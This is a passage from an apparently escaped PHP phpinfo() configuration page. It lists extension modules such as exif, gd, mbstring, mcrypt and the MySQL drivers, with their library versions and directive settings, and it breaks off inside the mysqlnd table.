&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr&gt;&lt;td class="e"&gt;EXIF Support &lt;/td&gt;&lt;td class="v"&gt;enabled &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;EXIF Version &lt;/td&gt;&lt;td class="v"&gt;1.4 $Id: exif.c 308362 2011-02-15 14:02:26Z pajoye $ &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Supported EXIF Version &lt;/td&gt;&lt;td class="v"&gt;0220 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Supported filetypes &lt;/td&gt;&lt;td class="v"&gt;JPEG,TIFF &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr class="h"&gt;&lt;th&gt;Directive&lt;/th&gt;&lt;th&gt;Local Value&lt;/th&gt;&lt;th&gt;Master Value&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;exif.decode_jis_intel&lt;/td&gt;&lt;td class="v"&gt;JIS&lt;/td&gt;&lt;td class="v"&gt;JIS&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;exif.decode_jis_motorola&lt;/td&gt;&lt;td class="v"&gt;JIS&lt;/td&gt;&lt;td class="v"&gt;JIS&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;exif.decode_unicode_intel&lt;/td&gt;&lt;td class="v"&gt;UCS-2LE&lt;/td&gt;&lt;td class="v"&gt;UCS-2LE&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;exif.decode_unicode_motorola&lt;/td&gt;&lt;td class="v"&gt;UCS-2BE&lt;/td&gt;&lt;td class="v"&gt;UCS-2BE&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;exif.encode_jis&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;exif.encode_unicode&lt;/td&gt;&lt;td class="v"&gt;ISO-8859-15&lt;/td&gt;&lt;td class="v"&gt;ISO-8859-15&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;h2&gt;&lt;a name="module_filter"&gt;filter&lt;/a&gt;&lt;/h2&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr&gt;&lt;td class="e"&gt;Input Validation and Filtering &lt;/td&gt;&lt;td class="v"&gt;enabled &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Revision &lt;/td&gt;&lt;td class="v"&gt;$Revision: 306939 $ &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr class="h"&gt;&lt;th&gt;Directive&lt;/th&gt;&lt;th&gt;Local Value&lt;/th&gt;&lt;th&gt;Master Value&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;filter.default&lt;/td&gt;&lt;td class="v"&gt;unsafe_raw&lt;/td&gt;&lt;td class="v"&gt;unsafe_raw&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;filter.default_flags&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;h2&gt;&lt;a name="module_ftp"&gt;ftp&lt;/a&gt;&lt;/h2&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr&gt;&lt;td class="e"&gt;FTP support &lt;/td&gt;&lt;td class="v"&gt;enabled &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;h2&gt;&lt;a name="module_gd"&gt;gd&lt;/a&gt;&lt;/h2&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr&gt;&lt;td class="e"&gt;GD Support &lt;/td&gt;&lt;td class="v"&gt;enabled &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;GD Version &lt;/td&gt;&lt;td class="v"&gt;bundled (2.0.34 compatible) &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;FreeType Support &lt;/td&gt;&lt;td class="v"&gt;enabled &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;FreeType Linkage &lt;/td&gt;&lt;td class="v"&gt;with freetype &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;FreeType Version &lt;/td&gt;&lt;td class="v"&gt;2.4.3 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;GIF Read Support &lt;/td&gt;&lt;td class="v"&gt;enabled &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;GIF Create Support &lt;/td&gt;&lt;td class="v"&gt;enabled &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;JPEG Support &lt;/td&gt;&lt;td class="v"&gt;enabled &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;libJPEG Version &lt;/td&gt;&lt;td class="v"&gt;6b &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;PNG Support &lt;/td&gt;&lt;td class="v"&gt;enabled &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;libPNG Version &lt;/td&gt;&lt;td class="v"&gt;1.2.44 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;WBMP Support &lt;/td&gt;&lt;td class="v"&gt;enabled &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;XBM Support &lt;/td&gt;&lt;td class="v"&gt;enabled &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr class="h"&gt;&lt;th&gt;Directive&lt;/th&gt;&lt;th&gt;Local Value&lt;/th&gt;&lt;th&gt;Master Value&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;gd.jpeg_ignore_warning&lt;/td&gt;&lt;td class="v"&gt;0&lt;/td&gt;&lt;td class="v"&gt;0&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;h2&gt;&lt;a name="module_gettext"&gt;gettext&lt;/a&gt;&lt;/h2&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr&gt;&lt;td class="e"&gt;GetText Support &lt;/td&gt;&lt;td class="v"&gt;enabled &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;h2&gt;&lt;a name="module_gmp"&gt;gmp&lt;/a&gt;&lt;/h2&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr&gt;&lt;td class="e"&gt;gmp support &lt;/td&gt;&lt;td class="v"&gt;enabled &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;MPIR version &lt;/td&gt;&lt;td class="v"&gt;1.3.1 &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;h2&gt;&lt;a name="module_hash"&gt;hash&lt;/a&gt;&lt;/h2&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr&gt;&lt;td class="e"&gt;hash support &lt;/td&gt;&lt;td class="v"&gt;enabled &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Hashing Engines &lt;/td&gt;&lt;td class="v"&gt;md2 md4 md5 sha1 sha224 sha256 sha384 sha512 ripemd128 ripemd160 ripemd256 ripemd320 whirlpool tiger128,3 tiger160,3 tiger192,3 tiger128,4 tiger160,4 tiger192,4 snefru snefru256 gost adler32 crc32 crc32b salsa10 salsa20 haval128,3 haval160,3 haval192,3 haval224,3 haval256,3 haval128,4 haval160,4 haval192,4 haval224,4 haval256,4 haval128,5 haval160,5 haval192,5 haval224,5 haval256,5  &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;h2&gt;&lt;a name="module_iconv"&gt;iconv&lt;/a&gt;&lt;/h2&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr&gt;&lt;td class="e"&gt;iconv support &lt;/td&gt;&lt;td class="v"&gt;enabled &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;iconv implementation &lt;/td&gt;&lt;td class="v"&gt;&amp;quot;libiconv&amp;quot; &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;iconv library version &lt;/td&gt;&lt;td class="v"&gt;1.11 &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr class="h"&gt;&lt;th&gt;Directive&lt;/th&gt;&lt;th&gt;Local Value&lt;/th&gt;&lt;th&gt;Master Value&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;iconv.input_encoding&lt;/td&gt;&lt;td class="v"&gt;ISO-8859-1&lt;/td&gt;&lt;td class="v"&gt;ISO-8859-1&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;iconv.internal_encoding&lt;/td&gt;&lt;td class="v"&gt;ISO-8859-1&lt;/td&gt;&lt;td class="v"&gt;ISO-8859-1&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;iconv.output_encoding&lt;/td&gt;&lt;td class="v"&gt;ISO-8859-1&lt;/td&gt;&lt;td class="v"&gt;ISO-8859-1&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;h2&gt;&lt;a name="module_imap"&gt;imap&lt;/a&gt;&lt;/h2&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr&gt;&lt;td class="e"&gt;IMAP c-Client Version &lt;/td&gt;&lt;td class="v"&gt;2007e &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;SSL Support &lt;/td&gt;&lt;td class="v"&gt;enabled &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;h2&gt;&lt;a name="module_json"&gt;json&lt;/a&gt;&lt;/h2&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr&gt;&lt;td class="e"&gt;json support &lt;/td&gt;&lt;td class="v"&gt;enabled &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;json version &lt;/td&gt;&lt;td class="v"&gt;1.2.1 &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;h2&gt;&lt;a name="module_ldap"&gt;ldap&lt;/a&gt;&lt;/h2&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr&gt;&lt;td class="e"&gt;LDAP Support &lt;/td&gt;&lt;td class="v"&gt;enabled &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;RCS Version &lt;/td&gt;&lt;td class="v"&gt;$Id: ldap.c 306939 2011-01-01 02:19:59Z felipe $ &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Total Links &lt;/td&gt;&lt;td class="v"&gt;0/unlimited &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;API Version &lt;/td&gt;&lt;td class="v"&gt;3001 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Vendor Name &lt;/td&gt;&lt;td class="v"&gt;OpenLDAP &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Vendor Version &lt;/td&gt;&lt;td class="v"&gt;20319 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;SASL Support &lt;/td&gt;&lt;td class="v"&gt;Enabled &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr class="h"&gt;&lt;th&gt;Directive&lt;/th&gt;&lt;th&gt;Local Value&lt;/th&gt;&lt;th&gt;Master Value&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;ldap.max_links&lt;/td&gt;&lt;td class="v"&gt;Unlimited&lt;/td&gt;&lt;td class="v"&gt;Unlimited&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;h2&gt;&lt;a name="module_libxml"&gt;libxml&lt;/a&gt;&lt;/h2&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr&gt;&lt;td class="e"&gt;libXML support &lt;/td&gt;&lt;td class="v"&gt;active &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;libXML Compiled Version &lt;/td&gt;&lt;td class="v"&gt;2.7.7 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;libXML Loaded Version &lt;/td&gt;&lt;td class="v"&gt;20707 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;libXML streams &lt;/td&gt;&lt;td class="v"&gt;enabled &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;h2&gt;&lt;a name="module_mbstring"&gt;mbstring&lt;/a&gt;&lt;/h2&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr&gt;&lt;td class="e"&gt;Multibyte Support &lt;/td&gt;&lt;td class="v"&gt;enabled &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Multibyte string engine &lt;/td&gt;&lt;td class="v"&gt;libmbfl &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;HTTP input encoding translation &lt;/td&gt;&lt;td class="v"&gt;disabled &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr class="h"&gt;&lt;th&gt;mbstring extension makes use of "streamable kanji code filter and converter", which is distributed under the GNU Lesser General Public License version 2.1.&lt;/th&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr&gt;&lt;td class="e"&gt;Multibyte (japanese) regex support &lt;/td&gt;&lt;td class="v"&gt;enabled &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Multibyte regex (oniguruma) version &lt;/td&gt;&lt;td class="v"&gt;4.7.1 &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr class="h"&gt;&lt;th&gt;Directive&lt;/th&gt;&lt;th&gt;Local Value&lt;/th&gt;&lt;th&gt;Master Value&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mbstring.detect_order&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mbstring.encoding_translation&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mbstring.func_overload&lt;/td&gt;&lt;td class="v"&gt;0&lt;/td&gt;&lt;td class="v"&gt;0&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mbstring.http_input&lt;/td&gt;&lt;td class="v"&gt;pass&lt;/td&gt;&lt;td class="v"&gt;pass&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mbstring.http_output&lt;/td&gt;&lt;td class="v"&gt;pass&lt;/td&gt;&lt;td class="v"&gt;pass&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mbstring.http_output_conv_mimetypes&lt;/td&gt;&lt;td class="v"&gt;^(text/|application/xhtml\+xml)&lt;/td&gt;&lt;td class="v"&gt;^(text/|application/xhtml\+xml)&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mbstring.internal_encoding&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mbstring.language&lt;/td&gt;&lt;td class="v"&gt;neutral&lt;/td&gt;&lt;td class="v"&gt;neutral&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mbstring.strict_detection&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mbstring.substitute_character&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;h2&gt;&lt;a name="module_mcrypt"&gt;mcrypt&lt;/a&gt;&lt;/h2&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr class="h"&gt;&lt;th&gt;mcrypt support&lt;/th&gt;&lt;th&gt;enabled&lt;/th&gt;&lt;/tr&gt;
&lt;tr class="h"&gt;&lt;th&gt;mcrypt_filter support&lt;/th&gt;&lt;th&gt;enabled&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Version &lt;/td&gt;&lt;td class="v"&gt;2.5.8 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Api No &lt;/td&gt;&lt;td class="v"&gt;20021217 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Supported ciphers &lt;/td&gt;&lt;td class="v"&gt;cast-128 gost rijndael-128 twofish cast-256 loki97 rijndael-192 saferplus wake blowfish-compat des rijndael-256 serpent xtea blowfish enigma rc2 tripledes arcfour  &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Supported modes &lt;/td&gt;&lt;td class="v"&gt;cbc cfb ctr ecb ncfb nofb ofb stream  &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr class="h"&gt;&lt;th&gt;Directive&lt;/th&gt;&lt;th&gt;Local Value&lt;/th&gt;&lt;th&gt;Master Value&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mcrypt.algorithms_dir&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mcrypt.modes_dir&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;h2&gt;&lt;a name="module_mhash"&gt;mhash&lt;/a&gt;&lt;/h2&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr&gt;&lt;td class="e"&gt;MHASH support &lt;/td&gt;&lt;td class="v"&gt;Enabled &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;MHASH API Version &lt;/td&gt;&lt;td class="v"&gt;Emulated Support &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;h2&gt;&lt;a name="module_mysql"&gt;mysql&lt;/a&gt;&lt;/h2&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr class="h"&gt;&lt;th&gt;MySQL Support&lt;/th&gt;&lt;th&gt;enabled&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Active Persistent Links &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Active Links &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Client API version &lt;/td&gt;&lt;td class="v"&gt;mysqlnd 5.0.8-dev - 20102224 - $Revision: 308673 $ &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr class="h"&gt;&lt;th&gt;Directive&lt;/th&gt;&lt;th&gt;Local Value&lt;/th&gt;&lt;th&gt;Master Value&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mysql.allow_local_infile&lt;/td&gt;&lt;td class="v"&gt;On&lt;/td&gt;&lt;td class="v"&gt;On&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mysql.allow_persistent&lt;/td&gt;&lt;td class="v"&gt;On&lt;/td&gt;&lt;td class="v"&gt;On&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mysql.connect_timeout&lt;/td&gt;&lt;td class="v"&gt;60&lt;/td&gt;&lt;td class="v"&gt;60&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mysql.default_host&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mysql.default_password&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mysql.default_port&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mysql.default_socket&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mysql.default_user&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mysql.max_links&lt;/td&gt;&lt;td class="v"&gt;Unlimited&lt;/td&gt;&lt;td class="v"&gt;Unlimited&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mysql.max_persistent&lt;/td&gt;&lt;td class="v"&gt;Unlimited&lt;/td&gt;&lt;td class="v"&gt;Unlimited&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mysql.trace_mode&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;h2&gt;&lt;a name="module_mysqli"&gt;mysqli&lt;/a&gt;&lt;/h2&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr class="h"&gt;&lt;th&gt;MysqlI Support&lt;/th&gt;&lt;th&gt;enabled&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Client API library version &lt;/td&gt;&lt;td class="v"&gt;mysqlnd 5.0.8-dev - 20102224 - $Revision: 308673 $ &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Active Persistent Links &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Inactive Persistent Links &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Active Links &lt;/td&gt;&lt;td class="v"&gt;0 &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr class="h"&gt;&lt;th&gt;Directive&lt;/th&gt;&lt;th&gt;Local Value&lt;/th&gt;&lt;th&gt;Master Value&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mysqli.allow_local_infile&lt;/td&gt;&lt;td class="v"&gt;On&lt;/td&gt;&lt;td class="v"&gt;On&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mysqli.allow_persistent&lt;/td&gt;&lt;td class="v"&gt;On&lt;/td&gt;&lt;td class="v"&gt;On&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mysqli.default_host&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mysqli.default_port&lt;/td&gt;&lt;td class="v"&gt;3306&lt;/td&gt;&lt;td class="v"&gt;3306&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mysqli.default_pw&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mysqli.default_socket&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mysqli.default_user&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;td class="v"&gt;&lt;i&gt;no value&lt;/i&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mysqli.max_links&lt;/td&gt;&lt;td class="v"&gt;Unlimited&lt;/td&gt;&lt;td class="v"&gt;Unlimited&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mysqli.max_persistent&lt;/td&gt;&lt;td class="v"&gt;Unlimited&lt;/td&gt;&lt;td class="v"&gt;Unlimited&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;mysqli.reconnect&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;td class="v"&gt;Off&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;br /&gt;
&lt;h2&gt;&lt;a name="module_mysqlnd"&gt;mysqlnd&lt;/a&gt;&lt;/h2&gt;
&lt;table border="0" cellpadding="3" width="600"&gt;
&lt;tr class="h"&gt;&lt;th&gt;mysqlnd&lt;/th&gt;&lt;th&gt;enabled&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Version &lt;/td&gt;&lt;td class="v"&gt;mysqlnd 5.0.8-dev - 20102224 - $Revision: 308673 $ &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Compression &lt;/td&gt;&lt;td class="v"&gt;supported &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;SSL &lt;/td&gt;&lt;td class="v"&gt;supported &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Command buffer size &lt;/td&gt;&lt;td class="v"&gt;4096 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Read buffer size &lt;/td&gt;&lt;td class="v"&gt;32768 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Read timeout &lt;/td&gt;&lt;td class="v"&gt;31536000 &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Collecting statistics &lt;/td&gt;&lt;td class="v"&gt;Yes &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Collecting memory statistics &lt;/td&gt;&lt;td class="v"&gt;No &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td class="e"&gt;Tracing &lt;/td&gt;&lt;td class="v"&gt;n/a &lt;/td&gt;&lt;/tr&gt;
